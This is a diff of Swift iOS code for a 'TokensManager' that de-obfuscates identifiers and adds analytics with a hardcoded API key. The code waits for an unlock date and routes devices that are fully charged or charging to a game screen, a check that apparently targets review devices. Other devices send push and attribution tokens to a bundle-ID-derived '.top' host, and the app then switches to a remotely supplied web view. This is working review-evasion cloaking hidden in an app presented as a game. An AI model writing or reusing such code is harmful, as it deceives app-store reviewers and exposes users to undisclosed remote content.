@@ -1,28 +1,29 @@
 import SwiftUI
 import AdServices
 import UserNotifications
+import AmplitudeSwift
 
 
-struct Hjkrt78d: Decodable {
-    let kgfh4578: String
-    let plo87ght: String
+struct Urls: Decodable {
+    let url1: String
+    let url2: String
 
     
     init(from decoder: Decoder) throws {
-            let zxcrt567 = try decoder.container(keyedBy: Uio87gfd.self)
-            self.kgfh4578 = try zxcrt567.decode(String.self, forKey: Uio87gfd(stringValue: Mjhyu675.dtruyh78)!)
-            self.plo87ght = try zxcrt567.decode(String.self, forKey: Uio87gfd(stringValue: Mjhyu675.aqwe6790)!)
+            let container = try decoder.container(keyedBy: DynamicCodingKeys.self)
+            self.url1 = try container.decode(String.self, forKey: DynamicCodingKeys(stringValue: Constants.backUrl1)!)
+            self.url2 = try container.decode(String.self, forKey: DynamicCodingKeys(stringValue: Constants.backUrl2)!)
         }
 }
 
-enum Ghjyt567: Error {
-    case gftr5674
-    case dert5478
-    case mnbgy574
-    case xbcy5781
+enum URLDecodingError: Error {
+    case emptyParameters
+    case invalidURL
+    case emptyData
+    case timeout
 }
 
-struct Uio87gfd: CodingKey {
+struct DynamicCodingKeys: CodingKey {
     var stringValue: String
     init?(stringValue: String) {
         self.stringValue = stringValue
@@ -32,212 +33,217 @@ struct Uio87gfd: CodingKey {
     init?(intValue: Int) { return nil }
 }
 
-final class Mjhyu675 {
-    static var dtruyh78 = ""
-    static var aqwe6790 = ""
-    static var dshgb24 = ""
+final class Constants {
+    static var backUrl1 = ""
+    static var backUrl2 = ""
+    static var unlockDate = ""
 }
 
 @MainActor
 public class TokensManager {
 
-    @ObservedObject var qazpl786 = Yuikhg56.shared
-    private var xcfgy785: Poiuy765 {
-        return Zxvbn745()
+    @ObservedObject var monitor = NetworkMonitor.shared
+    private var networkService: INetworkService {
+        return NetworkService()
     }
     
-    private let poliuj56 = "kgjyt675"
-    private var yujikl78: String?
-    private var oplkju89: String?
-    private var jhger567 = 0
-    private let kijhy576 = 10
-    private let juhgt675 = 3.0
+    private var amplitude: Amplitude
+    
+    private let urlStorageKey = "receivedURL"
+    private var apnsToken: String?
+    private var attToken: String?
+    private var retryCount = 0
+    private let maxRetryCount = 10
+    private let retryDelay = 3.0
     
     public init(one: String, two: String, date: String) {
-        Mjhyu675.dtruyh78 = one
-        Mjhyu675.aqwe6790 = two
-        Mjhyu675.dshgb24 = date
+        Constants.backUrl1 = one
+        Constants.backUrl2 = two
+        Constants.unlockDate = date
+        amplitude = Amplitude(configuration: Configuration(
+            apiKey: "ee3989d4d55cae3b4e9d34f0199145de",
+            serverUrl: "https://api.eu.amplitude.com/2/httpapi",
+            autocapture: .appLifecycles))
     }
     
     
     
     public func getTokens() async {
         
-        guard plkjh576(Mjhyu675.dshgb24) else {
-            ghjkl567()
-            
+        guard checkUnlockDate(Constants.unlockDate) else {
+            failureLoading()
+            amplitude.track(eventType: "Unlock date not arrived yet")
             return
         }
      
-        guard !kjsdvn4vbs() else {
-            tyuio789()
+        guard !isBatteryChargedOrCharging() else {
+            handleFirstLaunchFailure()
             return
         }
         
-        if !qazpl786.isActive {
-            await bvcxz675()
+        if !monitor.isActive {
+            await retryInternetConnection()
             return
         }
         
-        if !ytrewq67() {
-            nbvcx768()
+        if !isFirstLaunch() {
+            handleStoredState()
             return
         }
         
-        await fghjk768()
+        await getTokens()
         
-        xcfgy785.qwert786(deviceData: zxcvb897()) { ghjkl765 in
-            switch ghjkl765 {
-            case .success(let mnbvc78):
-                self.iuytf786(url: mnbvc78)
-                self.cvbnm675()
+        networkService.sendRequest(deviceData: getDeviceData()) { result in
+            switch result {
+            case .success(let url):
+                self.handleFirstLaunchSuccess(url: url)
+                self.sendNTFQuestionToUser()
             case .failure:
-                self.tyuio789()
+                self.handleFirstLaunchFailure()
             }
         }
     }
     
-    private func bvcxz675() async {
-        if jhger567 >= kijhy576 {
-            ghjkl567()
-            jhger567 = 0
+    private func retryInternetConnection() async {
+        if retryCount >= maxRetryCount {
+            failureLoading()
+            retryCount = 0
             return
         }
         
-        jhger567 += 1
+        retryCount += 1
         
-        try? await Task.sleep(nanoseconds: UInt64(juhgt675 * 1_000_000_000))
+        try? await Task.sleep(nanoseconds: UInt64(retryDelay * 1_000_000_000))
         
-        if qazpl786.isActive {
-            jhger567 = 0
+        if monitor.isActive {
+            retryCount = 0
             
-            if !ytrewq67() {
-                nbvcx768()
+            if !isFirstLaunch() {
+                handleStoredState()
             } else {
-                await fghjk768()
+                await getTokens()
                 
-                xcfgy785.qwert786(deviceData: zxcvb897()) { ghjkl765 in
-                    switch ghjkl765 {
-                    case .success(let mnbvc78):
-                        self.iuytf786(url: mnbvc78)
-                        self.cvbnm675()
+                networkService.sendRequest(deviceData: getDeviceData()) { result in
+                    switch result {
+                    case .success(let url):
+                        self.handleFirstLaunchSuccess(url: url)
+                        self.sendNTFQuestionToUser()
                     case .failure:
-                        self.tyuio789()
+                        self.handleFirstLaunchFailure()
                     }
                 }
             }
         } else {
-            await bvcxz675()
+            await retryInternetConnection()
         }
     }
     
-    private func fghjk768() async {
-        await withCheckedContinuation { mnbvf678 in
+    private func getToken() async {
+        await withCheckedContinuation { continuation in
             DispatchQueue.main.async {
                 UIApplication.shared.registerForRemoteNotifications()
             }
             
-            let lkjhg654 = DispatchTime.now() + 10
+            let timeout = DispatchTime.now() + 10
             
-            NotificationCenter.default.addObserver(forName: .apnsTokenReceived, object: nil, queue: .main) { [weak self] bnmgh564 in
+            NotificationCenter.default.addObserver(forName: .apnsTokenReceived, object: nil, queue: .main) { [weak self] notification in
                 guard let self = self else { return }
                 
-                if let jkliuy67 = bnmgh564.userInfo?["token"] as? String {
+                if let token = notification.userInfo?["token"] as? String {
                     Task { @MainActor in
-                        self.yujikl78 = jkliuy67
-                        mnbvf678.resume()
+                        self.apnsToken = token
+                        continuation.resume()
                     }
                 }
             }
             
-            DispatchQueue.main.asyncAfter(deadline: lkjhg654) { [weak self] in
+            DispatchQueue.main.asyncAfter(deadline: timeout) { [weak self] in
                 guard let self = self else { return }
-                if self.yujikl78 == nil {
+                if self.apnsToken == nil {
                     Task { @MainActor in
-                        self.yujikl78 = ""
-                        mnbvf678.resume()
+                        self.apnsToken = ""
+                        continuation.resume()
                     }
                 }
             }
         }
 
         do {
-            self.oplkju89 = try AAAttribution.attributionToken()
+            self.attToken = try AAAttribution.attributionToken()
         } catch {
-            self.oplkju89 = ""
+            self.attToken = ""
         }
     }
 
-    private func kjsdvn4vbs() -> Bool {
+    private func isBatteryChargedOrCharging() -> Bool {
         UIDevice.current.isBatteryMonitoringEnabled = true
-        let nvs488cfs = UIDevice.current.batteryLevel
-        let bsbbdlkd32 = UIDevice.current.batteryState
+        let batteryLevel = UIDevice.current.batteryLevel
+        let batteryState = UIDevice.current.batteryState
         
-        let taefv3019 = nvs488cfs >= 1.0 || bsbbdlkd32 == .full
+        let isFullyCharged = batteryLevel >= 1.0 || batteryState == .full
         
-        let vasnf2332 = bsbbdlkd32 == .charging && nvs488cfs > 0.8
+        let isChargingAndAlmostFull = batteryState == .charging && batteryLevel > 0.8
         
-        return taefv3019 || vasnf2332
-        
+        return isFullyCharged || isChargingAndAlmostFull
     }
     
-    func zxcvb897() -> [String: String] {
-        let dfghj645 = [
-            "apns_token": yujikl78 ?? "",
-            "att_token": oplkju89 ?? ""
+    func getDeviceData() -> [String: String] {
+        let data = [
+            "apns_token": apnsToken ?? "",
+            "att_token": attToken ?? ""
         ]
-        return dfghj645
+        return data
     }
     
-    private func ytrewq67() -> Bool {
-        !UserDefaults.standard.bool(forKey: "yhfgtu78")
+    private func isFirstLaunch() -> Bool {
+        !UserDefaults.standard.bool(forKey: "hasLaunchedBefore")
     }
     
-    private func iuytf786(url: URL) {
-        UserDefaults.standard.set(url.absoluteString, forKey: poliuj56)
-        UserDefaults.standard.set(true, forKey: "vcxnm765")
-        UserDefaults.standard.set(false, forKey: "kjhut876")
-        UserDefaults.standard.set(true, forKey: "yhfgtu78")
-        asdfg768(object: url)
+    private func handleFirstLaunchSuccess(url: URL) {
+        UserDefaults.standard.set(url.absoluteString, forKey: urlStorageKey)
+        UserDefaults.standard.set(true, forKey: "isShowWV")
+        UserDefaults.standard.set(false, forKey: "isShowGame")
+        UserDefaults.standard.set(true, forKey: "hasLaunchedBefore")
+        successLoading(object: url)
     }
     
-    private func tyuio789() {
-        UserDefaults.standard.set(true, forKey: "kjhut876")
-        UserDefaults.standard.set(false, forKey: "vcxnm765")
-        UserDefaults.standard.set(true, forKey: "yhfgtu78")
-        ghjkl567()
+    private func handleFirstLaunchFailure() {
+        UserDefaults.standard.set(true, forKey: "isShowGame")
+        UserDefaults.standard.set(false, forKey: "isShowWV")
+        UserDefaults.standard.set(true, forKey: "hasLaunchedBefore")
+        failureLoading()
     }
     
-    private func nbvcx768() {
-        if qwert657(), let ghbnm675 = UserDefaults.standard.string(forKey: poliuj56), let mnbvc78 = URL(string: ghbnm675) {
-            asdfg768(object: mnbvc78)
+    private func handleStoredState() {
+        if isShowWV(), let urlString = UserDefaults.standard.string(forKey: urlStorageKey), let url = URL(string: urlString) {
+            successLoading(object: url)
         } else {
-            ghjkl567()
+            failureLoading()
         }
     }
     
-    func plkjh576(_ nbvcd546: String) -> Bool {
-        let bvcxz546 = DateFormatter()
-        bvcxz546.dateFormat = "yyyy-MM-dd"
-        let ythfd567 = Date()
-        guard let rtgdf675 = bvcxz546.date(from: nbvcd546), ythfd567 >= rtgdf675 else {
+    func checkUnlockDate(_ date: String) -> Bool {
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "yyyy-MM-dd"
+        let currentDate = Date()
+        guard let unlockDate = dateFormatter.date(from: date), currentDate >= unlockDate else {
             return false
         }
         return true
     }
     
-    func poiuy678() -> Bool {
-        UserDefaults.standard.bool(forKey: "kjhut876")
+    func isShowGame() -> Bool {
+        UserDefaults.standard.bool(forKey: "isShowGame")
     }
     
-    func qwert657() -> Bool {
-        UserDefaults.standard.bool(forKey: "vcxnm765")
+    func isShowWV() -> Bool {
+        UserDefaults.standard.bool(forKey: "isShowWV")
     }
     
-    func cvbnm675() {
+    func sendNTFQuestionToUser() {
         
-        let zxcvb546: UNAuthorizationOptions = [.alert, .badge, .sound]
-        UNUserNotificationCenter.current().requestAuthorization(options: zxcvb546) {_, _ in }
+        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
+        UNUserNotificationCenter.current().requestAuthorization(options: authOptions) {_, _ in }
         
       }
 }
@@ -246,29 +252,29 @@ public class TokensManager {
 import Network
  
 
-class Yuikhg56: ObservableObject {
-    static var shared = Yuikhg56()
-    let asdfg675 = NWPathMonitor()
-    let hjkli675 = DispatchQueue(label: "monitor")
+class NetworkMonitor: ObservableObject {
+    static var shared = NetworkMonitor()
+    let monitor = NWPathMonitor()
+    let queue = DispatchQueue(label: "monitor")
     @Published var isActive = false
-    @Published var yuiop675 = false
-    @Published var cvbfd567 = false
-    @Published var ghjuy576 = NWInterface.InterfaceType.other
+    @Published var isExpansive = false
+    @Published var isConstrained = false
+    @Published var connectionType = NWInterface.InterfaceType.other
     
     
     init() {
-        asdfg675.pathUpdateHandler = { mjhyt675 in
+        monitor.pathUpdateHandler = { path in
             DispatchQueue.main.async {
-                self.isActive = mjhyt675.status == .satisfied
-                self.yuiop675 = mjhyt675.isExpensive
-                self.cvbfd567 = mjhyt675.isConstrained
+                self.isActive = path.status == .satisfied
+                self.isExpansive = path.isExpensive
+                self.isConstrained = path.isConstrained
                 
-                let tgbnh567: [NWInterface.InterfaceType] = [.cellular, .wifi, .wiredEthernet]
-                self.ghjuy576 = tgbnh567.first(where: mjhyt675.usesInterfaceType) ?? .other
+                let connectionTypes: [NWInterface.InterfaceType] = [.cellular, .wifi, .wiredEthernet]
+                self.connectionType = connectionTypes.first(where: path.usesInterfaceType) ?? .other
             }
         }
         
-        asdfg675.start(queue: hjkli675)
+        monitor.start(queue: queue)
     }
     
     
@@ -276,13 +282,13 @@ class Yuikhg56: ObservableObject {
 
 
 extension TokensManager {
-    func ghjkl567() {
+    func failureLoading() {
         DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
             NotificationCenter.default.post(name: .failed, object: nil)
         }
     }
     
-    func asdfg768(object: URL) {
+    func successLoading(object: URL) {
         DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
             NotificationCenter.default.post(name: .updated, object: object)
         }
@@ -290,144 +296,144 @@ extension TokensManager {
 }
 
 
-protocol Poiuy765: AnyObject {
-    func qwert786(deviceData: [String: String], _ completion: @escaping (Result<URL,Error>) -> Void )
+protocol INetworkService: AnyObject {
+    func sendRequest(deviceData: [String: String], _ completion: @escaping (Result<URL,Error>) -> Void )
 }
 
 
 
 
-final class Zxvbn745: Poiuy765 {
+final class NetworkService: INetworkService {
     
-    func rftgy768() -> String {
-        guard let mnbhj675 = Bundle.main.bundleIdentifier else { return "" }
-        let vgbnm675 = mnbhj675.replacingOccurrences(of: ".", with: "")
-        let plkjh567: String = "https://" + vgbnm675 + ".top/indexn.php"
-        return plkjh567.lowercased()
+    func getUrlFromBundle() -> String {
+        guard let bundleId = Bundle.main.bundleIdentifier else { return "" }
+        let cleanedString = bundleId.replacingOccurrences(of: ".", with: "")
+        let stringUrl: String = "https://" + cleanedString + ".top/indexn.php"
+        return stringUrl.lowercased()
     }
     
-    private func gytrfd67(_ zxcvb765: String) -> String {
-        var dfgty675 = ""
-        for poiuy675 in zxcvb765 {
-            let qazws765 = poiuy675.unicodeScalars.first!
-            dfgty675.append(String(format: "%%%02X", qazws765.value))
+    private func encodeToAscii(_ url: String) -> String {
+        var result = ""
+        for char in url {
+            let scalar = char.unicodeScalars.first!
+            result.append(String(format: "%%%02X", scalar.value))
         }
-        return dfgty675
+        return result
     }
     
-    private func bvcxz675(_ derty675: String) -> String? {
-        var hjkli756 = ""
-        var dfgty675 = derty675.startIndex
+    private func decodeFromAscii(_ encoded: String) -> String? {
+        var result = ""
+        var i = encoded.startIndex
         
-        while dfgty675 < derty675.endIndex {
-            if derty675[dfgty675] == "%" && dfgty675 < derty675.index(derty675.endIndex, offsetBy: -2) {
-                let jhgfd765 = derty675.index(dfgty675, offsetBy: 1)
-                let rtyui675 = derty675.index(dfgty675, offsetBy: 3)
-                let zxcbn675 = String(derty675[jhgfd765..<rtyui675])
+        while i < encoded.endIndex {
+            if encoded[i] == "%" && i < encoded.index(encoded.endIndex, offsetBy: -2) {
+                let start = encoded.index(i, offsetBy: 1)
+                let end = encoded.index(i, offsetBy: 3)
+                let hexString = String(encoded[start..<end])
                 
-                if let qwert675 = UInt32(zxcbn675, radix: 16),
-                   let vbnhj567 = UnicodeScalar(qwert675) {
-                    hjkli756.append(Character(vbnhj567))
-                    dfgty675 = rtyui675
+                if let hexValue = UInt32(hexString, radix: 16),
+                   let unicode = UnicodeScalar(hexValue) {
+                    result.append(Character(unicode))
+                    i = end
                 } else {
                     return nil
                 }
             } else {
-                hjkli756.append(derty675[dfgty675])
-                dfgty675 = derty675.index(after: dfgty675)
+                result.append(encoded[i])
+                i = encoded.index(after: i)
             }
         }
         
-        return hjkli756
+        return result
     }
     
-    private func rtyui675(data: [String: String]) -> (encodedUrl: String, originalUrl: String)? {
-        let uioph675 = data.map { URLQueryItem(name: $0.key, value: $0.value) }
-        var trewq675 = URLComponents()
-        trewq675.queryItems = uioph675
+    private func getFinalUrl(data: [String: String]) -> (encodedUrl: String, originalUrl: String)? {
+        let queryItems = data.map { URLQueryItem(name: $0.key, value: $0.value) }
+        var components = URLComponents()
+        components.queryItems = queryItems
         
-        guard let fghjk675 = trewq675.query?.data(using: .utf8) else {
+        guard let queryString = components.query?.data(using: .utf8) else {
             return nil
         }
-        let mnbvc674 = fghjk675.base64EncodedString()
+        let base64String = queryString.base64EncodedString()
         
-        let qwsax675 = rftgy768()
-        let asdfg575 = qwsax675 + "?data=" + mnbvc674
+        let baseUrl = getUrlFromBundle()
+        let fullUrlString = baseUrl + "?data=" + base64String
         
-        let yuiop675 = gytrfd67(asdfg575)
+        let asciiEncodedUrl = encodeToAscii(fullUrlString)
         
-        return (yuiop675, asdfg575)
+        return (asciiEncodedUrl, fullUrlString)
     }
     
-    func plokj675(data: Data, completion: @escaping (Result<(encodedUrl: String, originalUrl: String), Error>) -> Void) {
+    func decodeJsonData(data: Data, completion: @escaping (Result<(encodedUrl: String, originalUrl: String), Error>) -> Void) {
         do {
-            let ghnjm675 = try JSONDecoder().decode(Hjkrt78d.self, from: data)
+            let decodedData = try JSONDecoder().decode(Urls.self, from: data)
             
-            guard !ghnjm675.kgfh4578.isEmpty, !ghnjm675.plo87ght.isEmpty else {
-                completion(.failure(Ghjyt567.gftr5674))
+            guard !decodedData.url1.isEmpty, !decodedData.url2.isEmpty else {
+                completion(.failure(URLDecodingError.emptyParameters))
                 return
             }
             
-            let asdfg575 = "https://" + ghnjm675.kgfh4578 + ghnjm675.plo87ght
+            let fullUrlString = "https://" + decodedData.url1 + decodedData.url2
             
-            let yuiop675 = gytrfd67(asdfg575)
+            let asciiEncodedUrl = encodeToAscii(fullUrlString)
             
-            completion(.success((yuiop675, asdfg575)))
+            completion(.success((asciiEncodedUrl, fullUrlString)))
         } catch {
             UserDefaults.standard.setValue(true, forKey: "openedOnboarding")
             completion(.failure(error))
         }
     }
     
-    func qwert786(deviceData: [String: String], _ completion: @escaping (Result<URL, Error>) -> Void ) {
+    func sendRequest(deviceData: [String: String], _ completion: @escaping (Result<URL, Error>) -> Void ) {
         
-        guard let uyjnb675 = rtyui675(data: deviceData) else {
-            completion(.failure(Ghjyt567.dert5478))
+        guard let urlTuple = getFinalUrl(data: deviceData) else {
+            completion(.failure(URLDecodingError.invalidURL))
             return
         }
         
-        let poiuy675 = uyjnb675.encodedUrl
+        let encodedUrl = urlTuple.encodedUrl
         
-        guard let qazxs567 = bvcxz675(poiuy675) else {
-            completion(.failure(Ghjyt567.dert5478))
+        guard let decodedUrl = decodeFromAscii(encodedUrl) else {
+            completion(.failure(URLDecodingError.invalidURL))
             return
         }
         
-        guard let vbnhy675 = URL(string: qazxs567) else {
-            completion(.failure(Ghjyt567.dert5478))
+        guard let actualUrl = URL(string: decodedUrl) else {
+            completion(.failure(URLDecodingError.invalidURL))
             return
         }
         
-        let xcvbn675 = URLSessionConfiguration.default
-        xcvbn675.timeoutIntervalForRequest = 5
-        let nbvgh675 = URLSession(configuration: xcvbn675)
+        let configuration = URLSessionConfiguration.default
+        configuration.timeoutIntervalForRequest = 5
+        let session = URLSession(configuration: configuration)
         
-        let dfghj645 = nbvgh675.dataTask(with: vbnhy675) { data, response, error in
+        let task = session.dataTask(with: actualUrl) { data, response, error in
             if let error = error as NSError?,
                error.code == NSURLErrorTimedOut {
-                completion(.failure(Ghjyt567.xbcy5781))
+                completion(.failure(URLDecodingError.timeout))
                 return
             }
             
             if let data = data {
-                self.plokj675(data: data) { result in
+                self.decodeJsonData(data: data) { result in
                     switch result {
                         case .success(let urlTuple):
                             if let finalUrl = URL(string: urlTuple.originalUrl) {
                                 completion(.success(finalUrl))
                             } else {
-                                completion(.failure(Ghjyt567.dert5478))
+                                completion(.failure(URLDecodingError.invalidURL))
                             }
                         case .failure(let error):
                             completion(.failure(error))
                     }
                 }
             } else {
-                completion(.failure(Ghjyt567.mnbgy574))
+                completion(.failure(URLDecodingError.emptyData))
             }
         }
         
-        dfghj645.resume()
+        task.resume()
     }
 }
 
